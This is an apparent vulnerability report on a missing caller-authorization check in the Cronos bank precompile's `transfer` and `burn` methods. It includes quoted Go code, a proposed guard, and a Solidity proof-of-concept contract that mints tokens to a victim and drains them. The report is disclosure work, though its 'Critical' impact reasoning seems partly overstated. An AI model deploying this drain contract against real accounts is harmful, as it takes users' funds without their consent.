### Title
Bank Precompile `transfer` Accepts Arbitrary `sender` Without Caller Authorization Check - (File: x/cronos/keeper/precompiles/bank.go)

### Summary

The bank precompile's `transfer` method accepts a caller-supplied `sender` address and executes `bankKeeper.SendCoins(ctx, from, to, ...)` without verifying that `contract.Caller()` equals `sender`. Any EVM contract can drain `evm/{callerContract}` native bank tokens from any victim's account without the victim's consent.

### Finding Description

The bank precompile is deployed at `0x0000000000000000000000000000000000000064` and is callable by any EVM contract. Its `transfer` method unpacks three caller-supplied arguments — `sender`, `recipient`, and `amount` — and immediately executes a native bank transfer from `sender` to `recipient`:

```go
// x/cronos/keeper/precompiles/bank.go  lines 175-192
sender    := args[0].(common.Address)
recipient := args[1].(common.Address)
amount    := args[2].(*big.Int)
...
from := sdk.AccAddress(sender.Bytes())
to   := sdk.AccAddress(recipient.Bytes())
...
denom := EVMDenom(contract.Caller())          // evm/0x<callerContract>
...
bc.bankKeeper.SendCoins(ctx, from, to, sdk.NewCoins(amt))
``` [1](#0-0) 

There is no guard of the form `contract.Caller() == sender`. The denom is scoped to the calling contract's address (`evm/0x<callerContract>`), but the source account (`from`) is entirely attacker-controlled. Compare this with the `mint`/`burn` branch, which also uses `contract.Caller()` to derive the denom but never validates that the caller is authorized to act on behalf of the address passed in `args[0]`. [2](#0-1) 

The `IBankModule` Solidity interface confirms the surface is publicly callable:

```solidity
function transfer(address,address,uint256) external payable returns (bool);
``` [3](#0-2) 

The intended usage pattern (from the integration test contract `TestBank.sol`) is for a contract to pass `msg.sender` as the first argument, keeping the transfer self-referential:

```solidity
function nativeTransfer(address recipient, uint256 amount) public returns (bool) {
    _transfer(msg.sender, recipient, amount);
    return bank.transfer(msg.sender, recipient, amount);  // passes msg.sender
}
``` [4](#0-3) 

The precompile never enforces this pattern.

### Impact Explanation

**Critical — Unauthorized transfer of native bank tokens (CRC20/CRC21 native representations) from any user's account.**

`evm/` prefixed native tokens are real, spendable Cosmos bank-module coins. They are created whenever a contract calls `bank.mint(addr, amount)` (e.g., via `moveToNative`) and can be used for IBC transfers, staking, or any other Cosmos-layer operation. A user who has converted EVM tokens to their native representation holds `evm/0x<contractAddress>` coins in the bank module.

An attacker who controls the contract at `0x<contractAddress>` can call `bank.transfer(victimAddress, attackerAddress, fullBalance)` and the precompile will execute `bankKeeper.SendCoins` from the victim to the attacker with no further checks. The victim loses their entire native token balance of that denom in a single transaction.

The `burn` branch has the same structural flaw — `args[0]` is the address to burn *from*, and there is no check that `contract.Caller() == args[0]` — allowing any contract to destroy a victim's `evm/` tokens without consent. [5](#0-4) 

### Likelihood Explanation

- The bank precompile is live at a fixed address and callable by any deployed EVM contract with no whitelist.
- Any attacker can deploy a contract, have users interact with it (e.g., by presenting it as a legitimate token), and once users hold `evm/{attackerContract}` native tokens, drain them in a single call.
- The `mint` method has the same missing check: any contract can mint `evm/{callerContract}` tokens to any address, then immediately `transfer` them away — a complete round-trip attack with no victim precondition beyond the attacker's own minting step.
- No privileged access, leaked keys, or governance action is required.

### Recommendation

Add a caller-authorization check in the `TransferMethodName` case before executing `SendCoins`:

```go
if contract.Caller() != sender {
    return nil, errors.New("transfer: caller is not the sender")
}
```

Apply the same guard to the `BurnMethodName` case:

```go
if contract.Caller() != recipient {   // recipient == address to burn from
    return nil, errors.New("burn: caller is not the token owner")
}
``` [6](#0-5) 

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

interface IBankModule {
    function mint(address, uint256) external payable returns (bool);
    function transfer(address, address, uint256) external payable returns (bool);
    function balanceOf(address, address) external view returns (uint256);
}

contract BankDrain {
    // Bank precompile at 0x64
    IBankModule constant bank = IBankModule(0x0000000000000000000000000000000000000064);

    // Step 1: mint evm/0x<this> tokens to victim (no victim consent needed)
    function seedVictim(address victim, uint256 amount) external {
        bank.mint(victim, amount);
    }

    // Step 2: drain victim's evm/0x<this> tokens — no approval, no consent
    function drain(address victim, address attacker) external {
        uint256 bal = bank.balanceOf(address(this), victim);
        // sender = victim (arbitrary), recipient = attacker — no caller check
        bank.transfer(victim, attacker, bal);
    }
}
```

1. Attacker deploys `BankDrain` at address `0xDRAIN`.
2. Calls `seedVictim(victim, 1000)` — mints 1000 `evm/0xDRAIN` native tokens to victim's bank account.
3. Calls `drain(victim, attacker)` — the precompile executes `bankKeeper.SendCoins(victim, attacker, 1000 evm/0xDRAIN)` with no authorization check.
4. Victim's native token balance is zero; attacker holds 1000 `evm/0xDRAIN`.

The same `drain` call works against any user who independently acquired `evm/0xDRAIN` tokens through any other mechanism (IBC, conversion, etc.). [6](#0-5) [7](#0-6)
